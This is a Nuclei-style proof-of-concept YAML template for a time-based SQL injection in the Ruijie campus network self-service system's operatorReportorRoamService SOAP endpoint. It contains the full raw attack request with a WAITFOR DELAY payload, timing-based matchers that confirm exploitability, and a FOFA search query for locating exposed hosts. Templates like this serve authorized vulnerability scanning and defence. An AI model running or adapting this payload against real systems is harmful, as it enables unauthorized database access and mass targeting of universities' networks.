config/pocs/ruijie-operatorpeportorroamservice-sqli.yaml

id: ruijie-operatorpeportorroamservice-sqli

info:
  name: 锐捷校园网自助服务系统 operatorReportorRoamService - SQL注入
  author: qwtd
  severity: high
  reference:
    - https://github.com/wy876/POC/blob/main/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%87%AA%E5%8A%A9%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9FoperatorReportorRoamService%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    fofa-query: body="校园网自助服务系统"
  tags: 校园网自助服务系统

http:
  - raw:
      - |
        POST /selfservice/service/operatorReportorRoamService HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Upgrade-Insecure-Requests: 1
        Connection: close
        Content-Type: text/xml;charset=UTF-8

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.webservice.common.spl.ruijie.com">
        <soapenv:Header/>
            <soapenv:Body>
            <ser:queryOperatorUuid>
              <!--type: string-->
              <ser:in0>';WAITFOR DELAY '0:0:5'--</ser:in0>
            </ser:queryOperatorUuid>
            </soapenv:Body>
        </soapenv:Envelope>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "soap"
          - ".ruijie"
        condition: and
      - type: dsl
        dsl:
          - "duration>=5"
